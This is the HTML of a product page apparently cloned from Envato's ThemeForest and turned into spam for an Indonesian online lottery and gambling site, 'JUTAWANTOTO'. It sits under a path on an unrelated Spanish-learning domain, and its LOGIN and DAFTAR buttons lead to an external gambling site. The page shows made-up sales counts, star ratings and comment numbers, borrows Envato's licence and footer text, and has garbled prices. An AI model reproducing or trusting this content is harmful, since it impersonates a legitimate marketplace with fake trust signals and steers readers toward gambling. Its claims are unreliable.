-                                        <a class="js-item-header__cart-button e-btn--3d -color-primary -size-m" rel="nofollow" title="Add to Cart" data-view="modalAjax" href="https://spanishlearningprogram.com/cultural/">
-                                            <span class="item-header__cart-button-icon">
-                                                <i class="e-icon -icon-cart -margin-right"></i>
-                                            </span>
-
-                                            <span class="t-heading -size-m -color-light -margin-none">
-                                                <b class="t-currency"><span class="js-item-header__price">$33</span></b>
-                                            </span>
-                                        </a>
-                                    </div>
-                                </div>
-
-                                <div class="item-header__details-section" bis_skin_checked="1">
-                                    <div class="item-header__author-details" bis_skin_checked="1">
-                                        By <a rel="author" class="js-by-author" href="https://spanishlearningprogram.com/cultural/">JUTAWANTOTO</a>
-                                    </div>
-                                    <div class="item-header__sales-count" bis_skin_checked="1">
-                                        <svg width="16px" height="16px" viewBox="0 0 16 16" class="item-header__sales-count-icon" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
-                                            <title>Cart</title>
-                                            <path d="M 0.009 1.349 C 0.009 1.753 0.347 2.086 0.765 2.086 C 0.765 2.086 0.766 2.086 0.767 2.086 L 0.767 2.09 L 2.289 2.09 L 5.029 7.698 L 4.001 9.507 C 3.88 9.714 3.812 9.958 3.812 10.217 C 3.812 11.028 4.496 11.694 5.335 11.694 L 14.469 11.694 L 14.469 11.694 C 14.886 11.693 15.227 11.36 15.227 10.957 C 15.227 10.552 14.886 10.221 14.469 10.219 L 14.469 10.217 L 5.653 10.217 C 5.547 10.217 5.463 10.135 5.463 10.031 L 5.487 9.943 L 6.171 8.738 L 11.842 8.738 C 12.415 8.738 12.917 8.436 13.175 7.978 L 15.901 3.183 C 15.96 3.08 15.991 2.954 15.991 2.828 C 15.991 2.422 15.65 2.09 15.23 2.09 L 3.972 2.09 L 3.481 1.077 L 3.466 1.043 C 3.343 0.79 3.084 0.612 2.778 0.612 C 2.777 0.612 0.765 0.612 0.765 0.612 C 0.347 0.612 0.009 0.943 0.009 1.349 Z M 3.819 13.911 C 3.819 14.724 4.496 15.389 5.335 15.389 C 6.171 15.389 6.857 14.724 6.857 13.911 C 6.857 13.097 6.171 12.434 5.335 12.434 C 4.496 12.434 3.819 13.097 3.819 13.911 Z M 11.431 13.911 C 11.431 14.724 12.11 15.389 12.946 15.389 C 13.784 15.389 14.469 14.724 14.469 13.911 C 14.469 13.097 13.784 12.434 12.946 12.434 C 12.11 12.434 11.431 13.097 11.431 13.911 Z">
-                                            </path>
-
-                                        </svg>
-
-                                        <strong>13,303</strong> sales
-                                    </div>
-                                    <div class="item-header__envato-highlighted" bis_skin_checked="1">
-                                        <strong>TOGEL ONLINE</strong>
-                                        <svg width="16px" height="16px" viewBox="0 0 14 14" class="item-header__envato-checkmark-icon" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
-                                            <title></title>
-                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M0.333252 7.00004C0.333252 3.31814 3.31802 0.333374 6.99992 0.333374C8.76803 0.333374 10.4637 1.03575 11.714 2.286C12.9642 3.53624 13.6666 5.23193 13.6666 7.00004C13.6666 10.6819 10.6818 13.6667 6.99992 13.6667C3.31802 13.6667 0.333252 10.6819 0.333252 7.00004ZM6.15326 9.23337L9.89993 5.48671C10.0227 5.35794 10.0227 5.15547 9.89993 5.02671L9.54659 4.67337C9.41698 4.54633 9.20954 4.54633 9.07993 4.67337L5.91993 7.83337L4.91993 6.84004C4.85944 6.77559 4.77498 6.73903 4.68659 6.73903C4.5982 6.73903 4.51375 6.77559 4.45326 6.84004L4.09993 7.19337C4.03682 7.25596 4.00133 7.34116 4.00133 7.43004C4.00133 7.51892 4.03682 7.60412 4.09993 7.66671L5.68659 9.23337C5.74708 9.29782 5.83154 9.33439 5.91993 9.33439C6.00832 9.33439 6.09277 9.29782 6.15326 9.23337Z" fill="#79B530"></path>
-
-                                        </svg>
-                                       
-                                    </div>
-                                </div>
-
-
-                            </div>
-
-
-
-                            <!-- Desktop Item Navigation -->
-                            <div class="is-hidden-tablet-and-below page-tabs" bis_skin_checked="1">
-                                <ul>
-                                    <li class="selected"><a class="js-item-navigation-item-details t-link -decoration-none" href="https://spanishlearningprogram.com/cultural/">Item Details</a>
-                                    </li>
-                                    <li><a class="js-item-navigation-reviews t-link -decoration-none" href="https://spanishlearningprogram.com/cultural/"><span>Reviews</span><span>
-                                                <div class="rating-detailed-small" bis_skin_checked="1">
-                                                    <div class="rating-detailed-small__header" bis_skin_checked="1">
-                                                        <div class="rating-detailed-small__stars" bis_skin_checked="1">
-                                                            <div class="rating-detailed-small-center__star-rating" bis_skin_checked="1">
-                                                                <i class="e-icon -icon-star">
-                                                                </i> <i class="e-icon -icon-star">
-                                                                </i> <i class="e-icon -icon-star">
-                                                                </i> <i class="e-icon -icon-star">
-                                                                </i> <i class="e-icon -icon-star">
-                                                                </i>
-                                                            </div>
-                                                            5.00
-                                                            <span class="is-visually-hidden">5.00 stars</span>
-                                                        </div>
-                                                    </div>
-                                                </div>
-                                            </span><span class="item-navigation-reviews-comments">303</span></a></li>
-                                    <li><a class="js-item-navigation-comments t-link -decoration-none" href="https://spanishlearningprogram.com/cultural/"><span>Comments</span><span class="item-navigation-reviews-comments">9,999</span></a></li>
-                                    <li><a class="js-item-navigation-support t-link -decoration-none" href="https://spanishlearningprogram.com/cultural/">Support</a>
-                                    </li>
-                                </ul>
-
-
-                            </div>
-<style>.n-columns-2{display:grid;grid-template-columns:repeat(2,1fr);font-weight:700}.n-columns-2 a{text-align:center}.login,.register{color:#fff;padding:13px 10px}.login,.login-button{text-shadow:2px 2px #141414;border-radius:10px 10px;border:1px solid #fdfdfd;background:linear-gradient(to bottom,#000000 0,#1d1d1d 100%);color:#fff}.register,.register-button{text-shadow:2px 2px #050505;border-radius:10px 10px;background:linear-gradient(to bottom,#ffd700 0,#ff7b00 100%);border:1px solid #ffe600}</style>
-<!-- Section 2 -->
-  </div>
-</div>
-
-
-                            <!-- Tablet or below Item Navigation -->
-                            <div class="page-tabs--dropdown" data-view="replaceItemNavsWithRemote" data-target=".js-remote" bis_skin_checked="1">
-                                <div class="page-tabs--dropdown__slt-custom-wlabel" bis_skin_checked="1">
-                                    <div class="slt-custom-wlabel--page-tabs--dropdown" bis_skin_checked="1">
-                                        <label>
-                                            <span class="js-label">
-                                                Item Details
-                                            </span>
-                                            <span class="slt-custom-wlabel__arrow">
-                                                <i class="e-icon -icon-arrow-fill-down"></i>
-                                            </span>
-                                        </label>
-
-                                        <select class="js-remote">
-                                            <option selected="selected" data-url="/item/marketica-marketplace-wordpress-theme/8988002">Item
-                                                Details</option>
-                                            <option data-url="/item/marketica-marketplace-wordpress-theme/reviews/8988002">
-                                                Reviews (75)</option>
-                                            <option data-url="/item/marketica-marketplace-wordpress-theme/8988002/comments">
-                                                Comments (802)</option>
-                                            <option data-url="/item/marketica-marketplace-wordpress-theme/8988002/support">
-                                                Support</option>
-
-
-                                        </select>
-                                    </div>
-                                </div>
-                            </div>
-
-                            <div class="page-tabs" bis_skin_checked="1">
-                                <ul class="right item-bookmarking__left-icons_hidden" data-view="bookmarkStatesLoader">
-                                    <li class="js-favorite-widget item-bookmarking__control_icons--favorite" data-item-id="8988002"><a data-view="modalAjax" class="t-link -decoration-none" href="https://spanishlearningprogram.com/cultural/"><span class="item-bookmarking__control--label">Add to Favorites</span></a>
-                                    </li>
-                                    <li class="js-collection-widget item-bookmarking__control_icons--collection" data-item-id="8988002"><a data-view="modalAjax" class="t-link -decoration-none" href="https://spanishlearningprogram.com/cultural/"><span class="item-bookmarking__control--label">Add to Collection</span></a>
-                                    </li>
-                                </ul>
-                            </div>
-
-
-                        </div>
-                    </div>
-
-
-                    <div class="content-main" id="content" bis_skin_checked="1">
-
-                        <div class="grid-container" bis_skin_checked="1">
-                            <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
-window.GtmMeasurements.sendAnalyticsEvent({"eventName":"view_item","eventType":"user","ecommerce":{"currency":"USD","value":37.0,"items":[{"affiliation":"themeforest","item_id":8988002,"item_name":"Cultural ✈️ JUTAWANTOTO Link Bandar Bo Togel Situs Toto Platform Resmi Terpercaya #1","item_brand":"tokopress","item_category":"wordpress","item_category2":"ecommerce","item_category3":"woocommerce","price":37.0,"quantity":1,"item_add_on":"bundle_6month","item_variant":"regular"}]}});
-//]]></script>
-
-
-                            <div bis_skin_checked="1">
-                                <link href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEia-BJ9UDAGNFDT6Gw65lrjevCohO9IDKlxcmcywMCl0rEGUbPX1Z_HNTZs2ak2OCI5P_gClCJe6E58KqTVzhWtjI1GHT1H6gDruBoeoqT3LkafFeHIvu1r2KlzGkpN5WVAcwyFRVrDFYYUk4lZv83bDUvtdjMXUokvUNWRwKOqZdsvE5fIUSv7CzhrHuY/s1080/LINK-RESMITOGEL.jpg">
-
-                                <div class="content-s " bis_skin_checked="1">
-                                    <div class="item-bookmarking__left-icons__wrapper" bis_skin_checked="1">
-                                        <ul class="item-bookmarking__left-icons" data-view="bookmarkStatesLoader">
-                                            <li class="item-bookmarking__control_icons--favorite">
-                                                <span>
-                                                    <a title="Add to Favorites" data-view="modalAjax" href="https://spanishlearningprogram.com/cultural/"><span class="item-bookmarking__control--label">Add to
-                                                            Favorites</span></a>
-                                                </span>
-
-                                            </li>
-                                            <li class="item-bookmarking__control_icons--collection">
-                                                <span>
-                                                    <a title="Add to Collection" data-view="modalAjax" href="https://spanishlearningprogram.com/cultural/">
-                                                        <span class="item-bookmarking__control--label">Add to
-                                                            Collection</span>
-                                                    </a> </span>
-
-                                            </li>
-                                        </ul>
-                                    </div>
-
-
-                                    <div class="box--no-padding" bis_skin_checked="1">
-                                        <div class="item-preview live-preview-btn--blue -preview-live" bis_skin_checked="1">
-
-
-
-                                            <a target="_blank" href="https://bingung-yakk.pages.dev/"><img alt="Cultural ✈️ JUTAWANTOTO Link Bandar Bo Togel Situs Toto Platform Resmi Terpercaya #1" width="300" height="300" srcset="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEia-BJ9UDAGNFDT6Gw65lrjevCohO9IDKlxcmcywMCl0rEGUbPX1Z_HNTZs2ak2OCI5P_gClCJe6E58KqTVzhWtjI1GHT1H6gDruBoeoqT3LkafFeHIvu1r2KlzGkpN5WVAcwyFRVrDFYYUk4lZv83bDUvtdjMXUokvUNWRwKOqZdsvE5fIUSv7CzhrHuY/s1080/LINK-RESMITOGEL.jpg" sizes="(min-width: 1024px) 590px, (min-width: 1px) 100vw, 600px" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEia-BJ9UDAGNFDT6Gw65lrjevCohO9IDKlxcmcywMCl0rEGUbPX1Z_HNTZs2ak2OCI5P_gClCJe6E58KqTVzhWtjI1GHT1H6gDruBoeoqT3LkafFeHIvu1r2KlzGkpN5WVAcwyFRVrDFYYUk4lZv83bDUvtdjMXUokvUNWRwKOqZdsvE5fIUSv7CzhrHuY/s1080/LINK-RESMITOGEL.jpg"></a>
-                                            <div class="js- item-preview-image__gallery" data-title="Cultural ✈️ JUTAWANTOTO Link Bandar Bo Togel Situs Toto Platform Resmi Terpercaya #1" data-url="marketica-marketplace-wordpress-theme/screenshots/modal/8988002" bis_skin_checked="1">
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/00-marketica-preview-sale37.jpg">MARKETICA_PREVIEW/00-marketica-preview-sale37.jpg</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/01_marketica2_homepage.png">MARKETICA_PREVIEW/01_marketica2_homepage.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/02_marketica2_shop_page.png">MARKETICA_PREVIEW/02_marketica2_shop_page.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/03_marketica2_single_product_page.png">MARKETICA_PREVIEW/03_marketica2_single_product_page.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/04_marketica2_cart_page.png">MARKETICA_PREVIEW/04_marketica2_cart_page.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/05_marketica2_checkout_page.png">MARKETICA_PREVIEW/05_marketica2_checkout_page.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/06_marketica2_myaccount_login_page.png">MARKETICA_PREVIEW/06_marketica2_myaccount_login_page.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/07_marketica2_plan_and_pricing_page.png">MARKETICA_PREVIEW/07_marketica2_plan_and_pricing_page.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/08_marketica2_team_members_page.png">MARKETICA_PREVIEW/08_marketica2_team_members_page.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/09_marketica2_contact_page_template.png">MARKETICA_PREVIEW/09_marketica2_contact_page_template.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/10_marketica2_blog_page.png">MARKETICA_PREVIEW/10_marketica2_blog_page.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/11_marketica2_blog_post_formats.png">MARKETICA_PREVIEW/11_marketica2_blog_post_formats.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/12_marketica2_single_product_page.png">MARKETICA_PREVIEW/12_marketica2_single_product_page.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/13_marketica2_theme_customizer.png">MARKETICA_PREVIEW/13_marketica2_theme_customizer.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/14_marketica2_visualcomposer_templates.png">MARKETICA_PREVIEW/14_marketica2_visualcomposer_templates.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/15_marketica2_tablet_view.png">MARKETICA_PREVIEW/15_marketica2_tablet_view.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/16_marketica2_tablet_view_offcanvas_menu.png">MARKETICA_PREVIEW/16_marketica2_tablet_view_offcanvas_menu.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/17_marketica2_themeoptions_header.png">MARKETICA_PREVIEW/17_marketica2_themeoptions_header.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/18_marketica2_themeoptions_footer.png">MARKETICA_PREVIEW/18_marketica2_themeoptions_footer.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/19_marketica2_themeoptions_contact.png">MARKETICA_PREVIEW/19_marketica2_themeoptions_contact.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/20_marketica2_themeoptions_woocommerce.png">MARKETICA_PREVIEW/20_marketica2_themeoptions_woocommerce.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/21_marketica2_wcvendors_user_page.png">MARKETICA_PREVIEW/21_marketica2_wcvendors_user_page.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/22_marketica2_wcvendors_vendor_page.png">MARKETICA_PREVIEW/22_marketica2_wcvendors_vendor_page.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/23_marketica2_wcvendors_vendor_dashboard.png">MARKETICA_PREVIEW/23_marketica2_wcvendors_vendor_dashboard.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/24_marketica2_wcvendors_shop_settings.png">MARKETICA_PREVIEW/24_marketica2_wcvendors_shop_settings.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/25_marketica2_dokan_vendor_store_page.png">MARKETICA_PREVIEW/25_marketica2_dokan_vendor_store_page.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/26_marketica2_dokan_vendor_review_page.png">MARKETICA_PREVIEW/26_marketica2_dokan_vendor_review_page.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/27_marketica2_dokan_vendor_dashboard_page.png">MARKETICA_PREVIEW/27_marketica2_dokan_vendor_dashboard_page.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/28_marketica2_dokan_vendor_dashboard_products_page.png">MARKETICA_PREVIEW/28_marketica2_dokan_vendor_dashboard_products_page.png</a>
-                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/29_marketica2_dokan_vendor_dashboard_settings_page.png">MARKETICA_PREVIEW/29_marketica2_dokan_vendor_dashboard_settings_page.png</a>
-                                            </div>
-
-                                            <div class="item-preview__actions" bis_skin_checked="1">
-                                                <div class="n-columns-2">
-                                                    <a href="https://bingung-yakk.pages.dev/" rel="nofollow noreferrer" class="login">LOGIN</a>
-                                                    <a href="https://bingung-yakk.pages.dev/" rel="nofollow noreferrer" class="register">DAFTAR</a>
-                                                </div>
-                                            </div>
-                                            </div>
-
-                                        </div>
-                                    </div>
-
-
-                                    <div data-view="toggleItemDescription" bis_skin_checked="1">
-                                        <div class="js-item-togglable-content has-toggle" bis_skin_checked="1">
-
-                                            <div class="js-item-description-toggle item-description-toggle" bis_skin_checked="1">
-                                                <a class="item-description-toggle__link" href="https://spanishlearningprogram.com/cultural/">
-                                                    <span>Show More <i class="e-icon -icon-chevron-down"></i></span>
-                                                    <span class="item-description-toggle__less">Show Less <i class="e-icon -icon-chevron-down -rotate-180"></i></span>
-                                                </a>
-                                            </div>
-                                        </div>
-                                    </div>
-
-                                    <section data-view="recommendedItems" data-url="/item/marketica-marketplace-wordpress-theme/8988002/recommended_items" id="recommended_items">
-                                        <div class="author-recommended-collection" bis_skin_checked="1">
-
-                                            <ul class="author-recommended-collection__list" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_item_list&quot;,&quot;eventType&quot;:&quot;user&quot;,&quot;ecommerce&quot;:{&quot;currency&quot;:&quot;USD&quot;,&quot;item_list_name&quot;:&quot;Author Recommended tokopress&quot;,&quot;items&quot;:[{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:26116208,&quot;item_name&quot;:&quot;Retrave | Travel \u0026 Tour Agency Elementor Template Kit&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;template-kits&quot;,&quot;item_category2&quot;:&quot;elementor&quot;,&quot;item_category3&quot;:&quot;travel-accomodation&quot;,&quot;price&quot;:&quot;24&quot;,&quot;quantity&quot;:1,&quot;index&quot;:1},{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:26126773,&quot;item_name&quot;:&quot;Coursly | Education \u0026 Offline Course Elementor Template Kit&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;template-kits&quot;,&quot;item_category2&quot;:&quot;elementor&quot;,&quot;item_category3&quot;:&quot;education&quot;,&quot;price&quot;:&quot;24&quot;,&quot;quantity&quot;:1,&quot;index&quot;:2},{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:26416085,&quot;item_name&quot;:&quot;Sweeding | Wedding Event Invitation Elementor Template Kit&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;template-kits&quot;,&quot;item_category2&quot;:&quot;elementor&quot;,&quot;item_category3&quot;:&quot;weddings&quot;,&quot;price&quot;:&quot;24&quot;,&quot;quantity&quot;:1,&quot;index&quot;:3}]},&quot;item_list_id&quot;:8435762}">
-
-
-
-
-                                            </ul>
-                                        </div>
-                                        <div bis_skin_checked="1">
-
-                                        </div>
-                                    </section>
-
-
-
-
-
-
-                                    <div data-view="itemPageScrollEvents" bis_skin_checked="1"></div>
-                                </div>
-
-                                <div class="sidebar-l sidebar-right" bis_skin_checked="1">
-
-
-                                    <div class="pricebox-container" bis_skin_checked="1">
-                                        <div class="purchase-panel" bis_skin_checked="1">
-                                            <div id="purchase-form" class="purchase-form" bis_skin_checked="1">
-                                                <form data-view="purchaseForm" data-analytics-has-custom-click="true" data-analytics-click-payload="{&quot;eventName&quot;:&quot;add_to_cart&quot;,&quot;eventType&quot;:&quot;user&quot;,&quot;quantityUpdate&quot;:false,&quot;ecommerce&quot;:{&quot;currency&quot;:&quot;USD&quot;,&quot;value&quot;:37.0,&quot;items&quot;:[{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:8988002,&quot;item_name&quot;:&quot;Cultural ✈️ JUTAWANTOTO Link Bandar Bo Togel Situs Toto Platform Resmi Terpercaya #1&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;wordpress&quot;,&quot;item_category2&quot;:&quot;ecommerce&quot;,&quot;item_category3&quot;:&quot;woocommerce&quot;,&quot;price&quot;:&quot;37&quot;,&quot;quantity&quot;:1}]}}" action="https://spanishlearningprogram.com/cultural/" accept-charset="UTF-8" method="post">
-                                                    <input type="hidden" name="authenticity_token" value="o7V7LGbBjnF9HgzqsCOek0VUbYNaqFcrL72zjeu3cGTv2_7pn5UklFm7XFtDaDCfkbbeD4zdIzwPzjrUhXtbHQ" autocomplete="off">
-                                                    <div bis_skin_checked="1">
-                                                        <div data-view="itemVariantSelector" data-id="8988002" data-cookiebot-enabled="true" bis_skin_checked="1">
-                                                            <div class="purchase-form__selection" bis_skin_checked="1">
-                                                                <span class="purchase-form__license-type">
-                                                                    <span data-view="flyout" class="flyout">
-                                                                        <span class="js-license-selector__chosen-license purchase-form__license-dropdown">Regular
-                                                                            License</span>
-                                                                        <div class="js-flyout__body flyout__body -padding-side-removed" bis_skin_checked="1">
-                                                                            <span class="js-flyout__triangle flyout__triangle"></span>
-                                                                            <div class="license-selector" data-view="licenseSelector" bis_skin_checked="1">
-                                                                                <div class="js-license-selector__item license-selector__item" data-license="regular" data-name="Regular License" bis_skin_checked="1">
-
-                                                                                    <div class="license-selector__license-type" bis_skin_checked="1">
-                                                                                        <span class="t-heading -size-xxs">Regular
-                                                                                            License</span>
-                                                                                        <span class="js-license-selector__selected-label e-text-label -color-green -size-s " data-license="regular">Selected</span>
-                                                                                    </div>
-                                                                                    <div class="license-selector__price" bis_skin_checked="1">
-                                                                                        <span class="t-heading -size-m h-m0">
-                                                                                            <b class="t-currency"><span class="">$33</span></b>
-                                                                                        </span>
-                                                                                    </div>
-                                                                                    <div class="license-selector__description" bis_skin_checked="1">
-                                                                                        <p class="t-body -size-m h-m0">
-                                                                                            Use, by you or one client,
-                                                                                            in a single end product
-                                                                                            which end users <strong>are
-                                                                                                not</strong> charged
-                                                                                            for. The total price
-                                                                                            includes the item price and
-                                                                                            a buyer fee.</p>
-                                                                                    </div>
-                                                                                </div>
-                                                                            </div>
-                                                                            <div class="flyout__link" bis_skin_checked="1">
-                                                                                <p class="t-body -size-m h-m0">
-                                                                                    <a class="t-link -decoration-reversed" target="_blank" href="https://spanishlearningprogram.com/cultural//licenses/standard">View
-                                                                                        license details</a>
-                                                                                </p>
-                                                                            </div>
-                                                                        </div>
-                                                                    </span>
-
-
-                                                                    <input type="hidden" name="license" id="license" value="regular" class="js-purchase-default-license" data-license="regular" autocomplete="off">
-                                                                </span>
-
-                                                                <div class="js-purchase-heading purchase-form__price t-heading -size-xxl" bis_skin_checked="1">
-                                                                    <b class="t-currency"><span class="js-purchase-price">$303#.</span></b>
-                                                                </div>
-                                                            </div>
-
-
-                                                            <div class="purchase-form__license js-purchase-license is-active" data-license="regular" bis_skin_checked="1">
-                                                                <price class="js-purchase-license-prices" data-price-prepaid="$37" data-license="regular" data-price-prepaid-upgrade="$46.38" data-support-upgrade-price="$9.38" data-support-upgrade-saving="$12" data-support-extension-price="$15.63" data-support-extension-saving="$6.25" data-support-renewal-price="$10.00">
-                                                                </price>
-                                                            </div>
-
-                                                            <div class="purchase-form__support" bis_skin_checked="1">
-                                                                <ul class="t-icon-list -font-size-s -icon-size-s -offset-flush">
-                                                                    <li class="t-icon-list__item -icon-ok">
-                                                                        <span class="is-visually-hidden">Included:</span>
-                                                                        JUDI TOGEL
-                                                                    </li>
-                                                                    <li class="t-icon-list__item -icon-ok">
-                                                                        <span class="is-visually-hidden">Included:</span>
-                                                                        LINK TOTO
-                                                                    </li>
-                                                                    <li class="t-icon-list__item -icon-ok">
-                                                                        <span class="is-visually-hidden">Included:</span>
-                                                                        TOGEL<span class="purchase-form__author-name"></span>
-                                                                        <a class="t-link -decoration-reversed js-support__inclusion-link" data-view="modalAjax" href="/item_support/what_is_item_support/8988002">
-                                                                            <svg width="12px" height="13px" viewBox="0 0 12 13" class="" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
-                                                                                <title>More Info</title>
-                                                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M0 6.5a6 6 0 1 0 12 0 6 6 0 0 0-12 0zm7.739-3.17a.849.849 0 0 1-.307.664.949.949 0 0 1-.716.273c-.273 0-.529-.102-.716-.272a.906.906 0 0 1-.307-.665c0-.256.102-.512.307-.682.187-.17.443-.273.716-.273.273 0 .528.102.716.273a.908.908 0 0 1 .307.682zm-.103 6.34-.119.46c-.34.137-.613.24-.818.307a2.5 2.5 0 0 1-.716.103c-.409 0-.733-.103-.954-.307a.953.953 0 0 1-.341-.767c0-.12 0-.256.017-.375.017-.12.05-.273.085-.426l.426-1.517a7.14 7.14 0 0 1 .103-.41c.017-.119.034-.238.034-.357a.582.582 0 0 0-.12-.41c-.085-.068-.238-.119-.46-.119-.12 0-.239.017-.34.051-.069.03-.132.047-.189.064-.042.012-.082.024-.119.038l.12-.46c.234-.102.468-.18.69-.253l.11-.037c.24-.085.478-.119.734-.119.409 0 .733.102.954.307.222.187.341.477.341.784 0 .068 0 .187-.017.34v.003a2.173 2.173 0 0 1-.085.458l-.427 1.534-.102.41v.002c-.017.119-.034.237-.034.356 0 .204.051.34.136.409.137.085.307.119.46.102a1.3 1.3 0 0 0 .359-.051c.085-.051.17-.085.272-.12z" fill="#0084B4"></path>
-
-                                                                            </svg>
-
-                                                                        </a>
-                                                                    </li>
-                                                                </ul>
-
-                                                                <div class="purchase-form__upgrade purchase-form__upgrade--before-after-price" bis_skin_checked="1">
-                                                                    <div class="purchase-form__upgrade-checkbox purchase-form__upgrade-checkbox--before-after-price" bis_skin_checked="1">
-                                                                        <input type="hidden" name="support" id="support_default" value="bundle_6month" class="js-support__default" autocomplete="off">
-                                                                        <input type="checkbox" name="support" id="support" value="bundle_12month" class="js-support__option">
-                                                                    </div>
-                                                                    <div class="purchase-form__upgrade-info" bis_skin_checked="1">
-                                                                        <label class="purchase-form__label purchase-form__label--before-after-price" for="support">
-                                                                            Login Situs Bandar Togel
-                                                                            <span class="purchase-form__price purchase-form__price--before-after-price t-heading -size-xs h-pull-right">
-                                                                                <span class="js-renewal__price t-currency purchase-form__renewal-price purchase-form__renewal-price--strikethrough">$28.33</span>
-
-                                                                                <b class="t-currency">
-                                                                                    <span class="js-support__price">$3.03</span>
-                                                                                </b>
-                                                                            </span>
-                                                                        </label>
-                                                                    </div>
-                                                                </div>
-                                                            </div>
-                                                        </div>
-														
-                                                        <p class="t-body -size-m"><i>JUTAWANTOTO Cultural adalah situs resmi terpercaya untuk Bandar Bo Togel. Nikmati permainan togel yang aman dan nyaman dengan berbagai pilihan menarik!</i>
-                                                        </p>
-                                                        <div class="purchase-form__us-dollars-notice-container" bis_skin_checked="1">
-                                                            <p class="purchase-form__us-dollars-notice"><i>Price is in
-                                                                    US dollars and excludes tax and handling fees</i>
-                                                            </p>
-
-                                                        </div>
-                                                    </div>
-                                                </form>
-                                            </div>
-
-                                        </div>
-
-                                    </div>
-
-									<div class="t-body -size-s h-text-align-center h-mt2" bis_skin_checked="1">
-                                         All Rights Reserved JUTAWANTOTO Link Situs Togel
-                                        <br>
-                                        <a href="https://spanishlearningprogram.com/cultural/">Contact the JUTAWANTOTO Help Team</a>
-                                    </div>
-
-                                </div>
-
-                                <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
-window.addEventListener('unload',function(e){window.scrollTo(0,0);});
-//]]></script>
-                            </div>
-
-                        </div>
-                    </div>
-
-
-                    <div bis_skin_checked="1">
-
-
-                        <footer class="global-footer">
-                            <div class="grid-container -layout-wide" bis_skin_checked="1">
-                                <div class="global-footer__container" bis_skin_checked="1">
-                                    <nav class="global-footer-info-links">
-                                        <hr class="global-footer__separator is-hidden-desktop h-mb4">
-
-                                        <ul class="global-footer-info-links__list">
-                                            <li class="global-footer-info-links__list-item">
-                                                <ul class="global-footer-sublist">
-                                                    <li class="global-footer-sublist__item-title">
-                                                        Envato Market
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://spanishlearningprogram.com/cultural//hc/en-us/articles/41383541904281-Envato-Market-Terms">Terms</a>
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://spanishlearningprogram.com/cultural//licenses">Licenses</a>
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://build.envato.com">Market API</a>
-                                                    </li>
